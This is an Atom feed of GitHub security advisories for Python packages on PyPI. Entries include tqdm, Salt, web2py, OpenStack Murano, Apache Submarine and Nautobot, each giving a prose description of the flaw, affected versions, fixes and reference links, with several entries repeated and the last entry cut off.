<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2023-11-24T09:01:18.137Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[tqdm] TDQM Arbitrary Code Execution]]></title>
        <id>https://github.com/advisories/GHSA-r7q7-xcjw-qx8q</id>
        <link href="https://github.com/advisories/GHSA-r7q7-xcjw-qx8q"/>
        <updated>2023-11-22T22:16:18.000Z</updated>
        <content type="html"><![CDATA[<p>The <code>tqdm._version</code> module in tqdm versions 4.4.1 and 4.10 allows local users to execute arbitrary code via a crafted repo with a malicious git log in the current working directory.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-10075">https://nvd.nist.gov/vuln/detail/CVE-2016-10075</a></li>
<li><a href="https://github.com/tqdm/tqdm/issues/328">https://github.com/tqdm/tqdm/issues/328</a></li>
<li><a href="https://security.gentoo.org/glsa/201807-01">https://security.gentoo.org/glsa/201807-01</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2016/12/28/8">http://www.openwall.com/lists/oss-security/2016/12/28/8</a></li>
<li><a href="https://github.com/tqdm/tqdm/pull/330">https://github.com/tqdm/tqdm/pull/330</a></li>
<li><a href="https://web.archive.org/web/20170214023533/http://www.securityfocus.com/bid/95143">https://web.archive.org/web/20170214023533/http://www.securityfocus.com/bid/95143</a></li>
<li><a href="https://github.com/advisories/GHSA-r7q7-xcjw-qx8q">https://github.com/advisories/GHSA-r7q7-xcjw-qx8q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r7q7-xcjw-qx8q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-14T02:19:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[tqdm] TDQM Arbitrary Code Execution]]></title>
        <id>https://github.com/advisories/GHSA-r7q7-xcjw-qx8q</id>
        <link href="https://github.com/advisories/GHSA-r7q7-xcjw-qx8q"/>
        <updated>2023-11-22T22:16:18.000Z</updated>
        <content type="html"><![CDATA[<p>The <code>tqdm._version</code> module in tqdm versions 4.4.1 and 4.10 allows local users to execute arbitrary code via a crafted repo with a malicious git log in the current working directory.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-10075">https://nvd.nist.gov/vuln/detail/CVE-2016-10075</a></li>
<li><a href="https://github.com/tqdm/tqdm/issues/328">https://github.com/tqdm/tqdm/issues/328</a></li>
<li><a href="https://security.gentoo.org/glsa/201807-01">https://security.gentoo.org/glsa/201807-01</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2016/12/28/8">http://www.openwall.com/lists/oss-security/2016/12/28/8</a></li>
<li><a href="https://github.com/tqdm/tqdm/pull/330">https://github.com/tqdm/tqdm/pull/330</a></li>
<li><a href="https://web.archive.org/web/20170214023533/http://www.securityfocus.com/bid/95143">https://web.archive.org/web/20170214023533/http://www.securityfocus.com/bid/95143</a></li>
<li><a href="https://github.com/advisories/GHSA-r7q7-xcjw-qx8q">https://github.com/advisories/GHSA-r7q7-xcjw-qx8q</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-r7q7-xcjw-qx8q</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-14T02:19:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[salt] Salt Improper Access Control]]></title>
        <id>https://github.com/advisories/GHSA-vqh4-crjf-jjxx</id>
        <link href="https://github.com/advisories/GHSA-vqh4-crjf-jjxx"/>
        <updated>2023-11-22T21:59:32.000Z</updated>
        <content type="html"><![CDATA[<p>Salt 2015.8.x before 2015.8.4 does not properly handle clear messages on the minion, which allows man-in-the-middle attackers to execute arbitrary code by inserting packets into the minion-master data stream.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-1866">https://nvd.nist.gov/vuln/detail/CVE-2016-1866</a></li>
<li><a href="https://docs.saltstack.com/en/latest/topics/releases/2015.8.4.html">https://docs.saltstack.com/en/latest/topics/releases/2015.8.4.html</a></li>
<li><a href="http://lists.opensuse.org/opensuse-updates/2016-03/msg00034.html">http://lists.opensuse.org/opensuse-updates/2016-03/msg00034.html</a></li>
<li><a href="https://github.com/advisories/GHSA-vqh4-crjf-jjxx">https://github.com/advisories/GHSA-vqh4-crjf-jjxx</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-vqh4-crjf-jjxx</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-05-14T02:11:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[web2py] web2py exposure of sensitive information]]></title>
        <id>https://github.com/advisories/GHSA-jr83-vr4j-mp6p</id>
        <link href="https://github.com/advisories/GHSA-jr83-vr4j-mp6p"/>
        <updated>2023-11-22T21:57:06.000Z</updated>
        <content type="html"><![CDATA[<p>web2py before 2.14.2 allows remote attackers to obtain the session_cookie_key value via a direct request to examples/simple_examples/status.  NOTE: this issue can be leveraged by remote attackers to execute arbitrary code using CVE-2016-3957.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-3954">https://nvd.nist.gov/vuln/detail/CVE-2016-3954</a></li>
<li><a href="https://devco.re/blog/2017/01/03/web2py-unserialize-code-execution-CVE-2016-3957/">https://devco.re/blog/2017/01/03/web2py-unserialize-code-execution-CVE-2016-3957/</a></li>
<li><a href="https://usn.ubuntu.com/4030-1/">https://usn.ubuntu.com/4030-1/</a></li>
<li><a href="https://github.com/web2py/web2py/commit/0820926b500a321060ef6a76ce89fd35a252f8b0">https://github.com/web2py/web2py/commit/0820926b500a321060ef6a76ce89fd35a252f8b0</a></li>
<li><a href="https://github.com/advisories/GHSA-jr83-vr4j-mp6p">https://github.com/advisories/GHSA-jr83-vr4j-mp6p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jr83-vr4j-mp6p</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-05-14T00:57:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[python-muranoclient] OpenStack Murano Code Execution]]></title>
        <id>https://github.com/advisories/GHSA-87r7-q54j-f9qg</id>
        <link href="https://github.com/advisories/GHSA-87r7-q54j-f9qg"/>
        <updated>2023-11-22T21:21:33.000Z</updated>
        <content type="html"><![CDATA[<p>OpenStack Murano before 1.0.3 (liberty) and 2.x before 2.0.1 (mitaka), Murano-dashboard before 1.0.3 (liberty) and 2.x before 2.0.1 (mitaka), and python-muranoclient before 0.7.3 (liberty) and 0.8.x before 0.8.5 (mitaka) improperly use loaders inherited from yaml.Loader when parsing MuranoPL and UI files, which allows remote attackers to create arbitrary Python objects and execute arbitrary code via crafted extended YAML tags in UI definitions in packages.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-4972">https://nvd.nist.gov/vuln/detail/CVE-2016-4972</a></li>
<li><a href="https://bugs.launchpad.net/murano/+bug/1586079">https://bugs.launchpad.net/murano/+bug/1586079</a></li>
<li><a href="https://bugs.launchpad.net/python-muranoclient/+bug/1586078">https://bugs.launchpad.net/python-muranoclient/+bug/1586078</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2016/06/23/8">http://www.openwall.com/lists/oss-security/2016/06/23/8</a></li>
<li><a href="https://github.com/openstack/murano/commit/28de8c36c9dbe4aaf4d062e6fb6099afd437f49b">https://github.com/openstack/murano/commit/28de8c36c9dbe4aaf4d062e6fb6099afd437f49b</a></li>
<li><a href="https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/notes/safeloader-cve-2016-4972-19035a2a091ec30a.yaml">https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/notes/safeloader-cve-2016-4972-19035a2a091ec30a.yaml</a></li>
<li><a href="https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/source/locale/en_GB/LC_MESSAGES/releasenotes.po">https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/source/locale/en_GB/LC_MESSAGES/releasenotes.po</a></li>
<li><a href="https://github.com/advisories/GHSA-87r7-q54j-f9qg">https://github.com/advisories/GHSA-87r7-q54j-f9qg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-87r7-q54j-f9qg</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-17T03:48:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[murano-dashboard] OpenStack Murano Code Execution]]></title>
        <id>https://github.com/advisories/GHSA-87r7-q54j-f9qg</id>
        <link href="https://github.com/advisories/GHSA-87r7-q54j-f9qg"/>
        <updated>2023-11-22T21:21:33.000Z</updated>
        <content type="html"><![CDATA[<p>OpenStack Murano before 1.0.3 (liberty) and 2.x before 2.0.1 (mitaka), Murano-dashboard before 1.0.3 (liberty) and 2.x before 2.0.1 (mitaka), and python-muranoclient before 0.7.3 (liberty) and 0.8.x before 0.8.5 (mitaka) improperly use loaders inherited from yaml.Loader when parsing MuranoPL and UI files, which allows remote attackers to create arbitrary Python objects and execute arbitrary code via crafted extended YAML tags in UI definitions in packages.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-4972">https://nvd.nist.gov/vuln/detail/CVE-2016-4972</a></li>
<li><a href="https://bugs.launchpad.net/murano/+bug/1586079">https://bugs.launchpad.net/murano/+bug/1586079</a></li>
<li><a href="https://bugs.launchpad.net/python-muranoclient/+bug/1586078">https://bugs.launchpad.net/python-muranoclient/+bug/1586078</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2016/06/23/8">http://www.openwall.com/lists/oss-security/2016/06/23/8</a></li>
<li><a href="https://github.com/openstack/murano/commit/28de8c36c9dbe4aaf4d062e6fb6099afd437f49b">https://github.com/openstack/murano/commit/28de8c36c9dbe4aaf4d062e6fb6099afd437f49b</a></li>
<li><a href="https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/notes/safeloader-cve-2016-4972-19035a2a091ec30a.yaml">https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/notes/safeloader-cve-2016-4972-19035a2a091ec30a.yaml</a></li>
<li><a href="https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/source/locale/en_GB/LC_MESSAGES/releasenotes.po">https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/source/locale/en_GB/LC_MESSAGES/releasenotes.po</a></li>
<li><a href="https://github.com/advisories/GHSA-87r7-q54j-f9qg">https://github.com/advisories/GHSA-87r7-q54j-f9qg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-87r7-q54j-f9qg</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-17T03:48:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[python-muranoclient] OpenStack Murano Code Execution]]></title>
        <id>https://github.com/advisories/GHSA-87r7-q54j-f9qg</id>
        <link href="https://github.com/advisories/GHSA-87r7-q54j-f9qg"/>
        <updated>2023-11-22T21:21:33.000Z</updated>
        <content type="html"><![CDATA[<p>OpenStack Murano before 1.0.3 (liberty) and 2.x before 2.0.1 (mitaka), Murano-dashboard before 1.0.3 (liberty) and 2.x before 2.0.1 (mitaka), and python-muranoclient before 0.7.3 (liberty) and 0.8.x before 0.8.5 (mitaka) improperly use loaders inherited from yaml.Loader when parsing MuranoPL and UI files, which allows remote attackers to create arbitrary Python objects and execute arbitrary code via crafted extended YAML tags in UI definitions in packages.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-4972">https://nvd.nist.gov/vuln/detail/CVE-2016-4972</a></li>
<li><a href="https://bugs.launchpad.net/murano/+bug/1586079">https://bugs.launchpad.net/murano/+bug/1586079</a></li>
<li><a href="https://bugs.launchpad.net/python-muranoclient/+bug/1586078">https://bugs.launchpad.net/python-muranoclient/+bug/1586078</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2016/06/23/8">http://www.openwall.com/lists/oss-security/2016/06/23/8</a></li>
<li><a href="https://github.com/openstack/murano/commit/28de8c36c9dbe4aaf4d062e6fb6099afd437f49b">https://github.com/openstack/murano/commit/28de8c36c9dbe4aaf4d062e6fb6099afd437f49b</a></li>
<li><a href="https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/notes/safeloader-cve-2016-4972-19035a2a091ec30a.yaml">https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/notes/safeloader-cve-2016-4972-19035a2a091ec30a.yaml</a></li>
<li><a href="https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/source/locale/en_GB/LC_MESSAGES/releasenotes.po">https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/source/locale/en_GB/LC_MESSAGES/releasenotes.po</a></li>
<li><a href="https://github.com/advisories/GHSA-87r7-q54j-f9qg">https://github.com/advisories/GHSA-87r7-q54j-f9qg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-87r7-q54j-f9qg</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-17T03:48:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[murano-dashboard] OpenStack Murano Code Execution]]></title>
        <id>https://github.com/advisories/GHSA-87r7-q54j-f9qg</id>
        <link href="https://github.com/advisories/GHSA-87r7-q54j-f9qg"/>
        <updated>2023-11-22T21:21:33.000Z</updated>
        <content type="html"><![CDATA[<p>OpenStack Murano before 1.0.3 (liberty) and 2.x before 2.0.1 (mitaka), Murano-dashboard before 1.0.3 (liberty) and 2.x before 2.0.1 (mitaka), and python-muranoclient before 0.7.3 (liberty) and 0.8.x before 0.8.5 (mitaka) improperly use loaders inherited from yaml.Loader when parsing MuranoPL and UI files, which allows remote attackers to create arbitrary Python objects and execute arbitrary code via crafted extended YAML tags in UI definitions in packages.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-4972">https://nvd.nist.gov/vuln/detail/CVE-2016-4972</a></li>
<li><a href="https://bugs.launchpad.net/murano/+bug/1586079">https://bugs.launchpad.net/murano/+bug/1586079</a></li>
<li><a href="https://bugs.launchpad.net/python-muranoclient/+bug/1586078">https://bugs.launchpad.net/python-muranoclient/+bug/1586078</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2016/06/23/8">http://www.openwall.com/lists/oss-security/2016/06/23/8</a></li>
<li><a href="https://github.com/openstack/murano/commit/28de8c36c9dbe4aaf4d062e6fb6099afd437f49b">https://github.com/openstack/murano/commit/28de8c36c9dbe4aaf4d062e6fb6099afd437f49b</a></li>
<li><a href="https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/notes/safeloader-cve-2016-4972-19035a2a091ec30a.yaml">https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/notes/safeloader-cve-2016-4972-19035a2a091ec30a.yaml</a></li>
<li><a href="https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/source/locale/en_GB/LC_MESSAGES/releasenotes.po">https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/source/locale/en_GB/LC_MESSAGES/releasenotes.po</a></li>
<li><a href="https://github.com/advisories/GHSA-87r7-q54j-f9qg">https://github.com/advisories/GHSA-87r7-q54j-f9qg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-87r7-q54j-f9qg</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-17T03:48:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[murano] OpenStack Murano Code Execution]]></title>
        <id>https://github.com/advisories/GHSA-87r7-q54j-f9qg</id>
        <link href="https://github.com/advisories/GHSA-87r7-q54j-f9qg"/>
        <updated>2023-11-22T21:21:33.000Z</updated>
        <content type="html"><![CDATA[<p>OpenStack Murano before 1.0.3 (liberty) and 2.x before 2.0.1 (mitaka), Murano-dashboard before 1.0.3 (liberty) and 2.x before 2.0.1 (mitaka), and python-muranoclient before 0.7.3 (liberty) and 0.8.x before 0.8.5 (mitaka) improperly use loaders inherited from yaml.Loader when parsing MuranoPL and UI files, which allows remote attackers to create arbitrary Python objects and execute arbitrary code via crafted extended YAML tags in UI definitions in packages.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-4972">https://nvd.nist.gov/vuln/detail/CVE-2016-4972</a></li>
<li><a href="https://bugs.launchpad.net/murano/+bug/1586079">https://bugs.launchpad.net/murano/+bug/1586079</a></li>
<li><a href="https://bugs.launchpad.net/python-muranoclient/+bug/1586078">https://bugs.launchpad.net/python-muranoclient/+bug/1586078</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2016/06/23/8">http://www.openwall.com/lists/oss-security/2016/06/23/8</a></li>
<li><a href="https://github.com/openstack/murano/commit/28de8c36c9dbe4aaf4d062e6fb6099afd437f49b">https://github.com/openstack/murano/commit/28de8c36c9dbe4aaf4d062e6fb6099afd437f49b</a></li>
<li><a href="https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/notes/safeloader-cve-2016-4972-19035a2a091ec30a.yaml">https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/notes/safeloader-cve-2016-4972-19035a2a091ec30a.yaml</a></li>
<li><a href="https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/source/locale/en_GB/LC_MESSAGES/releasenotes.po">https://github.com/openstack/murano/blob/c898a310afbc27f12190446ef75d8b0bd12115eb/releasenotes/source/locale/en_GB/LC_MESSAGES/releasenotes.po</a></li>
<li><a href="https://github.com/advisories/GHSA-87r7-q54j-f9qg">https://github.com/advisories/GHSA-87r7-q54j-f9qg</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-87r7-q54j-f9qg</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-17T03:48:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-submarine] SQL injection in Apache Submarine]]></title>
        <id>https://github.com/advisories/GHSA-v5gj-fx3g-hcpw</id>
        <link href="https://github.com/advisories/GHSA-v5gj-fx3g-hcpw"/>
        <updated>2023-11-22T20:58:12.000Z</updated>
        <content type="html"><![CDATA[<p>Apache Software Foundation Apache Submarine has an SQL injection vulnerability when a user logs in. This issue can result in unauthorized login.</p>
<p>Now we have fixed this issue and now user must have the correct login to access workbench. This issue affects Apache Submarine: from 0.7.0 before 0.8.0.&nbsp;We recommend that all submarine users with 0.7.0 upgrade to 0.8.0, which not only fixes the issue, supports the oidc authentication mode, but also removes the case of unauthenticated logins.</p>
<p>If using the version lower than 0.8.0 and not want to upgrade, you can try cherry-pick PR  <a href="https://github.com/apache/submarine/pull/1037">https://github.com/apache/submarine/pull/1037</a> <a href="https://github.com/apache/submarine/pull/1054">https://github.com/apache/submarine/pull/1054</a>  and rebuild the submarine-server image to fix this.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-37924">https://nvd.nist.gov/vuln/detail/CVE-2023-37924</a></li>
<li><a href="https://github.com/apache/submarine/pull/1037">https://github.com/apache/submarine/pull/1037</a></li>
<li><a href="https://issues.apache.org/jira/browse/SUBMARINE-1361">https://issues.apache.org/jira/browse/SUBMARINE-1361</a></li>
<li><a href="https://lists.apache.org/thread/g99h773vd49n1wyghdq1llv2f83w1b3r">https://lists.apache.org/thread/g99h773vd49n1wyghdq1llv2f83w1b3r</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/apache-submarine/PYSEC-2023-244.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/apache-submarine/PYSEC-2023-244.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-v5gj-fx3g-hcpw">https://github.com/advisories/GHSA-v5gj-fx3g-hcpw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v5gj-fx3g-hcpw</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-11-22T12:30:26.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nautobot] Cross-site Scripting potential in custom links, job buttons, and computed fields]]></title>
        <id>https://github.com/advisories/GHSA-cf9f-wmhp-v4pr</id>
        <link href="https://github.com/advisories/GHSA-cf9f-wmhp-v4pr"/>
        <updated>2023-11-22T20:55:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>All users of Nautobot versions earlier than 1.6.6 or 2.0.5 are potentially affected.</p>
<p>Due to incorrect usage of Django's <code>mark_safe()</code> API when rendering certain types of user-authored content, including:</p>
<ul>
<li>custom links</li>
<li>job buttons</li>
<li>computed fields</li>
</ul>
<p>it is possible that users with permission to create or edit these types of content could craft a malicious payload (such as JavaScript code) that would be executed when rendering pages containing this content.</p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<p>We have fixed the incorrect uses of <code>mark_safe()</code> (generally by replacing them with appropriate use of <code>format_html()</code> instead) to prevent such malicious data from being executed.</p>
<p>Users on Nautobot 1.6.x LTM should upgrade to v1.6.6 and users on Nautobot 2.0.x should upgrade to v2.0.5.</p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<p>Appropriate object permissions can and should be applied to restrict which users are permitted to create or edit the aforementioned types of user-authored content. Other than that, there is no direct fix available.</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<ul>
<li><a href="https://github.com/nautobot/nautobot/pull/4832">https://github.com/nautobot/nautobot/pull/4832</a></li>
<li><a href="https://github.com/nautobot/nautobot/pull/4833">https://github.com/nautobot/nautobot/pull/4833</a></li>
<li><a href="https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.html.format_html">https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.html.format_html</a></li>
<li><a href="https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.safestring.mark_safe">https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.safestring.mark_safe</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/nautobot/nautobot/security/advisories/GHSA-cf9f-wmhp-v4pr">https://github.com/nautobot/nautobot/security/advisories/GHSA-cf9f-wmhp-v4pr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-48705">https://nvd.nist.gov/vuln/detail/CVE-2023-48705</a></li>
<li><a href="https://github.com/nautobot/nautobot/pull/4832">https://github.com/nautobot/nautobot/pull/4832</a></li>
<li><a href="https://github.com/nautobot/nautobot/pull/4833">https://github.com/nautobot/nautobot/pull/4833</a></li>
<li><a href="https://github.com/nautobot/nautobot/commit/362850f5a94689a4c75e3188bf6de826c3b012b2">https://github.com/nautobot/nautobot/commit/362850f5a94689a4c75e3188bf6de826c3b012b2</a></li>
<li><a href="https://github.com/nautobot/nautobot/commit/54abe23331b6c3d0d82bf1b028c679b1d200920d">https://github.com/nautobot/nautobot/commit/54abe23331b6c3d0d82bf1b028c679b1d200920d</a></li>
<li><a href="https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.html.format_html">https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.html.format_html</a></li>
<li><a href="https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.safestring.mark_safe">https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.safestring.mark_safe</a></li>
<li><a href="https://github.com/advisories/GHSA-cf9f-wmhp-v4pr">https://github.com/advisories/GHSA-cf9f-wmhp-v4pr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cf9f-wmhp-v4pr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-11-22T20:55:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nautobot] Cross-site Scripting potential in custom links, job buttons, and computed fields]]></title>
        <id>https://github.com/advisories/GHSA-cf9f-wmhp-v4pr</id>
        <link href="https://github.com/advisories/GHSA-cf9f-wmhp-v4pr"/>
        <updated>2023-11-22T20:55:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>All users of Nautobot versions earlier than 1.6.6 or 2.0.5 are potentially affected.</p>
<p>Due to incorrect usage of Django's <code>mark_safe()</code> API when rendering certain types of user-authored content, including:</p>
<ul>
<li>custom links</li>
<li>job buttons</li>
<li>computed fields</li>
</ul>
<p>it is possible that users with permission to create or edit these types of content could craft a malicious payload (such as JavaScript code) that would be executed when rendering pages containing this content.</p>
<h3 id="patches">Patches</h3>
<p><em>Has the problem been patched? What versions should users upgrade to?</em></p>
<p>We have fixed the incorrect uses of <code>mark_safe()</code> (generally by replacing them with appropriate use of <code>format_html()</code> instead) to prevent such malicious data from being executed.</p>
<p>Users on Nautobot 1.6.x LTM should upgrade to v1.6.6 and users on Nautobot 2.0.x should upgrade to v2.0.5.</p>
<h3 id="workarounds">Workarounds</h3>
<p><em>Is there a way for users to fix or remediate the vulnerability without upgrading?</em></p>
<p>Appropriate object permissions can and should be applied to restrict which users are permitted to create or edit the aforementioned types of user-authored content. Other than that, there is no direct fix available.</p>
<h3 id="references">References</h3>
<p><em>Are there any links users can visit to find out more?</em></p>
<ul>
<li><a href="https://github.com/nautobot/nautobot/pull/4832">https://github.com/nautobot/nautobot/pull/4832</a></li>
<li><a href="https://github.com/nautobot/nautobot/pull/4833">https://github.com/nautobot/nautobot/pull/4833</a></li>
<li><a href="https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.html.format_html">https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.html.format_html</a></li>
<li><a href="https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.safestring.mark_safe">https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.safestring.mark_safe</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/nautobot/nautobot/security/advisories/GHSA-cf9f-wmhp-v4pr">https://github.com/nautobot/nautobot/security/advisories/GHSA-cf9f-wmhp-v4pr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2023-48705">https://nvd.nist.gov/vuln/detail/CVE-2023-48705</a></li>
<li><a href="https://github.com/nautobot/nautobot/pull/4832">https://github.com/nautobot/nautobot/pull/4832</a></li>
<li><a href="https://github.com/nautobot/nautobot/pull/4833">https://github.com/nautobot/nautobot/pull/4833</a></li>
<li><a href="https://github.com/nautobot/nautobot/commit/362850f5a94689a4c75e3188bf6de826c3b012b2">https://github.com/nautobot/nautobot/commit/362850f5a94689a4c75e3188bf6de826c3b012b2</a></li>
<li><a href="https://github.com/nautobot/nautobot/commit/54abe23331b6c3d0d82bf1b028c679b1d200920d">https://github.com/nautobot/nautobot/commit/54abe23331b6c3d0d82bf1b028c679b1d200920d</a></li>
<li><a href="https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.html.format_html">https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.html.format_html</a></li>
<li><a href="https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.safestring.mark_safe">https://docs.djangoproject.com/en/3.2/ref/utils/#django.utils.safestring.mark_safe</a></li>
<li><a href="https://github.com/advisories/GHSA-cf9f-wmhp-v4pr">https://github.com/advisories/GHSA-cf9f-wmhp-v4pr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cf9f-wmhp-v4pr</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2023-11-22T20:55:54.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nautobot-device-onboarding] Clear Text Credentials Exposed via Onboarding Task]]></title>
        <id>https://github.com/advisories/GHSA-qf3c-rw9f-jh7v</id>
